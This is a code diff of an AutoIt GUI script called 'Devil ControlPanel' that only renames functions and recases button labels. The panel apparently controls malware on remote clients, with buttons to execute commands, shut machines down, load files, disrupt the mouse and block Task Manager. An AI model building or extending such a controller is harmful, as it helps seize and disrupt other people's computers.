@@ -22,7 +22,7 @@ Global $ClientID = ""
 Global $InputBox = ""
 
 ; Exit hotkey
-HotKeySet("{ESC}", "FastClosing")
+HotKeySet("{ESC}", "Terminate")
 
 ; Password protection
 Local $Entered_Password = InputBox("Devil ControlPanel", "Enter the password to access the control panel!", "", "*", 270, 130)
@@ -45,10 +45,10 @@ EndIf
 $ControlPanel = GUICreate("Devil ControlPanel", 301, 316, -1, -1)
 GUISetBkColor(0xFFFFFF)
 $Group1 = GUICtrlCreateGroup("Actions", 16, 48, 265, 153)
-$ShowMessageBox_Button = GUICtrlCreateButton("SHOW MESSAGE BOX", 24, 72, 251, 25)
-$ExecuteToCMD_Button = GUICtrlCreateButton("EXECUTE TO CMD", 24, 104, 251, 25)
-$SystemShutdown_Button = GUICtrlCreateButton("SHUTDOWN", 24, 136, 251, 25)
-$LoadFile_Button = GUICtrlCreateButton("LOAD FILE", 24, 168, 251, 25)
+$ShowMessageBox_Button = GUICtrlCreateButton("Show Message Box", 24, 72, 251, 25)
+$ExecuteToCMD_Button = GUICtrlCreateButton("Execute to CMD", 24, 104, 251, 25)
+$SystemShutdown_Button = GUICtrlCreateButton("Shutdown", 24, 136, 251, 25)
+$LoadFile_Button = GUICtrlCreateButton("Load File", 24, 168, 251, 25)
 GUICtrlCreateGroup("", -99, -99, 1, 1)
 $Text = GUICtrlCreateLabel("Client ID", 16, 18, 62, 20)
 GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
@@ -71,39 +71,39 @@ While True
 	$GUICommand = GUIGetMsg()
 	Switch $GUICommand
 		Case $GUI_EVENT_CLOSE
-			FastClosing()
+			Terminate()
         Case $ShowMessageBox_Button
             LockGUI()
             ShowMessageBox()
-            UnLockGUI()
+            UnlockGUI()
         Case $ExecuteToCMD_Button
             LockGUI()
             ExecuteToCMD()
-            UnLockGUI()
+            UnlockGUI()
         Case $SystemShutdown_Button
             LockGUI()
             SystemShutdown()
-            UnLockGUI()
+            UnlockGUI()
         Case $LoadFile_Button
             LockGUI()
             LoadFile()
-            UnLockGUI()
+            UnlockGUI()
         Case $CrazyMouse_EnableButton
             LockGUI()
             EnableCrazyMouse()
-            UnLockGUI()
+            UnlockGUI()
         Case $CrazyMouse_DisableButton
             LockGUI()
             DisableCrazyMouse()
-            UnLockGUI()
+            UnlockGUI()
         Case $BlockTaskManager_EnableButton
             LockGUI()
             EnableBlockTaskManager()
-            UnLockGUI()
+            UnlockGUI()
         Case $BlockTaskManager_DisableButton
             LockGUI()
             DisableBlockTaskManager()
-            UnLockGUI()
+            UnlockGUI()
 	EndSwitch
 WEnd
 
@@ -286,7 +286,7 @@ Func LockGUI()
 EndFunc
 
 ; Unlock gui elements
-Func UnLockGUI()
+Func UnlockGUI()
     GUICtrlSetState($ShowMessageBox_Button, $GUI_ENABLE)
     GUICtrlSetState($ExecuteToCMD_Button, $GUI_ENABLE)
     GUICtrlSetState($SystemShutdown_Button, $GUI_ENABLE)
@@ -299,7 +299,7 @@ Func UnLockGUI()
 EndFunc
 
 ; Exit
-Func FastClosing()
+Func Terminate()
     If GUICtrlRead($InputBox) = "" Then
         Exit
     Else
